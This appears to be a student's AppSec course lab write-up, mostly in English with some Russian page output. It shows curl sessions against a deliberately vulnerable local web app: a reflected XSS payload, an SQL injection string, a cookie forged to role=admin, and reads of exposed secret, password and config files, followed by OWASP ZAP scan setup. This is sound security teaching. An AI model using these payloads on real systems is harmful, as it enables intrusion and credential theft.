...
<a href="https://img.shields.io/badge/Risk_Analyze-2448a2"><img src="https://img.shields.io/badge/Course-Risk_Analysis-2448a2" alt= "RA"></a> <img src="https://img.shields.io/badge/AppSec-2448a2" alt= "RA"></a> <img src="https://img.shields.io/badge/Contributor-Чередвоа А.С.-8b9aff" alt="Contributor Badge"></a></div>
...
```bash
(venv) acher@LAPTOP-G8JP4BBC:~/course_labs/labs/lab08$ docker compose up -d --build  # http://localhost:8080
...
```bash
(venv) acher@LAPTOP-G8JP4BBC:~/course_labs/labs/lab08$ curl -i http://localhost:8080
HTTP/1.1 200 OK
...
```bash
(venv) acher@LAPTOP-G8JP4BBC:~/course_labs/labs/lab08$ curl --url-query "msg=<script>alert('hack with XSS')</script>" http://localhost:8080/echo
    <h2>Echo</h2>
...
```bash
(venv) acher@LAPTOP-G8JP4BBC:~/course_labs/labs/lab08$ curl --url-query "username=admin" http://localhost:8080/search
...
(venv) acher@LAPTOP-G8JP4BBC:~/course_labs/labs/lab08$ curl --url-query "username=admin' OR '1'='1" http://localhost:8080/search
    <h2>Поиск пользователя</h2>
...
```bash
(venv) acher@LAPTOP-G8JP4BBC:~/course_labs/labs/lab08$ curl -X POST -d "username=admin&password=admin123" http://localhost:8080/login
<h2>Добро пожаловать, admin (admin)!</h2><a href='/'>На главную</a>

(venv) acher@LAPTOP-G8JP4BBC:~/course_labs/labs/lab08$ curl -X POST -d "username=user&password=user123" http://localhost:8080/login
...
```bash
(venv) acher@LAPTOP-G8JP4BBC:~/course_labs/labs/lab08$ curl -b "role=guest" http://localhost:8080/profile
    <h2>Профиль пользователя</h2>
    <p>Имя: guest</p>
    <p>Роль: guest</p>

(venv) acher@LAPTOP-G8JP4BBC:~/course_labs/labs/lab08$ curl -b "role=admin" http://localhost:8080/profile
    <h2>Профиль пользователя</h2>
    <p>Имя: guest</p>
    <p>Роль: admin</p>
```
...
```bash
(venv) acher@LAPTOP-G8JP4BBC:~/course_labs/labs/lab08$ curl http://localhost:8080/admin
<h2>Доступ запрещён: вы не admin</h2><p>Попробуйте изменить cookie 'role'.</p><a href='/'>Назад</a>

(venv) acher@LAPTOP-G8JP4BBC:~/course_labs/labs/lab08$ curl -b "role=admin" http://localhost:8080/admin
    <h2>Admin panel</h2>
...
```bash
(venv) acher@LAPTOP-G8JP4BBC:~/course_labs/labs/lab08$ curl http://localhost:8080/files/
...
(venv) acher@LAPTOP-G8JP4BBC:~/course_labs/labs/lab08$ curl http://localhost:8080/files/secret.txt
<pre>SECRET_TOKEN=123456
</pre>

(venv) acher@LAPTOP-G8JP4BBC:~/course_labs/labs/lab08$ curl http://localhost:8080/files/passwords.txt
<pre>admin:admin123
user:user123
...
(venv) acher@LAPTOP-G8JP4BBC:~/course_labs/labs/lab08$ curl http://localhost:8080/files/config.json
<pre>{
  "database": {
    "host": "localhost",
    "port": 5432,
...
```bash
(venv) acher@LAPTOP-G8JP4BBC:~/course_labs/labs/lab08$ sudo docker pull ghcr.io/zaproxy/zaproxy:stable
...
```bash
(venv) acher@LAPTOP-G8JP4BBC:~/course_labs/labs/lab08$ export ZAP_IMAGE=ghcr.io/zaproxy/zaproxy:stable
$ export TARGET_URL=http://172.18.0.2:8080  # Container IP in Docker network
$ echo "ZAP_IMAGE=$ZAP_IMAGE"
ZAP_IMAGE=ghcr.io/zaproxy/zaproxy:stable

(venv) acher@LAPTOP-G8JP4BBC:~/course_labs/labs/lab08$ echo "TARGET_URL=$TARGET_URL"
...
```bash
(venv) acher@LAPTOP-G8JP4BBC:~/course_labs/labs/lab08$ chmod +x dast/zap_scan.sh
...
(venv) acher@LAPTOP-G8JP4BBC:~/course_labs/labs/lab08$ ls -lh dast/reports/
...
(venv) acher@LAPTOP-G8JP4BBC:~/course_labs/labs/lab08$ /home/kali/course_labs/labs/lab08/venv/bin/python dast/convert_reports.py 20260114_154633
